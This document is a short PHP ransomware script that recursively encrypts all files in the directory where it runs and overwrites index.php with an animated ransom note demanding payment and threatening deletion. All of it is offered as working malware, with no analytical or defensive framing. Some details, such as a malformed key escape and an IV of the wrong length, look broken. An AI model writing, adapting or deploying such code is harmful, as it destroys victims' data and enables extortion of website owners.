<?php
$encryptionKey = "\x01\ErX\x00\xXX\x22\xe2asdfghjklzxcvbnmqwertyuiop"; // Change this to your desired encryption key
// Function to encrypt a file
function encryptFile($fileName, $encryptionKey) {
    $fileContent = file_get_contents($fileName);
    $encryptedContent = openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3');
    file_put_contents($fileName, $encryptedContent);
}

// Encrypt all files in a directory
function encryptDirectory($dir, $encryptionKey) {
    $files = scandir($dir);
    foreach($files as $file) {
        $filePath = $dir . '/' . $file;
        if(is_file($filePath)) {
            encryptFile($filePath, $encryptionKey);
        } elseif($file != '.' && $file != '..' && is_dir($filePath)) {
            encryptDirectory($filePath, $encryptionKey);
        }
    }
}

// Function to create glitch effect on text
function glitchText($text) {
    $glitchedText = '';
    for ($i = 0; $i < strlen($text); $i++) {
        $glitchedText .= '<span style="color: white; text-shadow: 0 0 2px #00FFFF, 0 0 5px #00FFFF, 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 30px #00FFFF, 0 0 40px #00FFFF, 0 0 55px #00FFFF, 0 0 75px #00FFFF;">' . $text[$i] . '</span>';
    }
    return $glitchedText;
}

// Main ransomware function
function ransomware($encryptionKey) {
    // Encrypt files in current directory
    encryptDirectory('.', $encryptionKey);
}

// Call the ransomware function
ransomware($encryptionKey);
$notes = '<style>
    @keyframes colorChange {
        0% {
            background-color: blue;
        }
        100% {
            background-color: purple;
        }
    }

    @keyframes glitch {
        2%, 64% {
            transform: translate(2px, -2px);
        }
        4%, 60% {
            transform: translate(-2px, 2px);
        }
        62% {
            transform: translate(-1px, 1px);
        }
    }

    body {
        font-family: Arial, sans-serif;
        font-size: 20px;
        text-align: center;
    }

    h1 {
        color: white;
        font-size: 28px;
        animation: glitch 0.3s infinite;
    }

    p {
        color: white;
        font-size: 18px;
        animation: glitch 0.3s infinite;
    }

    .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        overflow: hidden;
        animation: colorChange 5s infinite;
    }
</style>

<div class="container">
    <h1>Oops, your files have been encrypted!</h1>
    <p>To decrypt your files, you must pay a ransom.</p>
    <p>Contact us at [email protected] for payment details.</p>
    <p>Failure to comply will result in permanent deletion of your files.</p>
</div>';
file_put_contents('index.php', $notes);
?>